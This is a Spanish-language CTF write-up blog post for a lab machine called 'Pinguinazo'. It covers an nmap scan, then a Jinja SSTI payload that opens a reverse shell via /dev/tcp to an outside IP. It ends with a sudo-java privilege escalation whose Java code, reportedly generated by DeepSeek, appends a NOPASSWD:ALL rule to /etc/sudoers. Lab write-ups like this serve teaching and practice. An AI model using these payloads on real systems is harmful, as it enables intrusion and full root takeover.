---
title: Pinguinazo
excerpt: Pinguinazo
publishDate: 'Oct 26 2025'
tags:
  - pinguinazo
seo:
  image:
    src: '/pinguino.png'
    alt: Imagen creada con Chat GPT
---

![Pinguino](/pinguino.png)

***Resumen***: Este es un Writeup un poco más directo que los que leí y que muestra como la IA puede ayudarnos en un proceso de intrusión.

***Nota***: Se ha usado [DeepSeek](https://Deepseek.com)

## Escaneo

Commo siempre escaneamos la máquina a ver que puertos, servicios y versiones tiene abiertos. Para ello usamos nuestro querido Nmap.

```bash
sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN pinguinazo.txt 
````

[![5000](/5000_pinguinazo.png)](/5000_pinguinazo.png)

Vemos que tenemos el puerto 5000 abierto, así que vamos a visitarlo.

[![ssti](/ssti_pinguinazo.png)](/ssti_pinguinazo.png)

## Intrusión

Nos encontramos con un panel de registroque, después de unas pruebas tipo {{2*2}} nos muestra que es vulenrable a SSTI. Ponemos nuestro nc a escuchar en el puerto 443 y en la web insertamos la siguiente reverse shell y deberíamos estár dentro de la máquina como el usuario pinguinazo.

```bash
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "sh -i >& /dev/tcp/192.168.1.42/443 0>&1"').read() }}
 ```

 [![reverse](/reverse_pinguinazo.png)](/reverse_pinguinazo.png)
 [![dentro](/dentro_pinguinazo.png)](/dentro_pinguinazo.png)

## Escalada

La escalada en esta máquina es muy fácil, tan solo hay que abusar de SUDO y generar un código en java que podamos ejecutar y que nos de los permisos de root.

```bash
sudo -l
```

Como vemos podemos usar java.

[![java](/java_pinguinazo.png)](/java_pinguinazo.png)

Copiamos esta salida a Deepseek y nos da un código que solo tenemos que compilar y ejecutar y ya seremos root.

 [![deep](/deep_pinguinazo.png)](/deep_pinguinazo.png)

 ```bash
 // E.java
public class E {
public static void main(String[] a) throws Exception {
    // Comando más simple
    Process p = Runtime.getRuntime().exec(new String[]{
        "sh", "-c", "echo pinguinazo ALL=\\(ALL\\) NOPASSWD:ALL >> /etc/sudoers"
    });
    int exitCode = p.waitFor();
    System.out.println("Completado. Código de salida: " + exitCode);
    }
}
````
Este código debe ir dentro de una archivo.

Ahora solo compilarlo y ejecutarlo.

```bash
javac E.java
sudo java E
````

![root(/root_pinguinazo.png)](/root_pinguinazo.png)
